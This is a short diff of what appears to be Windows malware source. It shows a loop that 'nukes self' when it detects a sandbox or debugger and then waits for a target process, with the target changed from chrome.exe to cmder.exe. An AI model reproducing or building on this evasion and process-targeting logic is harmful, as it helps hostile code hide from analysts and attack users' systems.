@@ -38,7 +38,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	do
 	{
 		hide.IsBeingWatched(resolver);				  // Nuke self if in sandbox or debugger
-		process = tools.GetPID("chrome.exe");	  // Check if target process is running
+		process = tools.GetPID("cmder.exe");	  // Check if target process is running
 
 		if (process != 0)
 		{
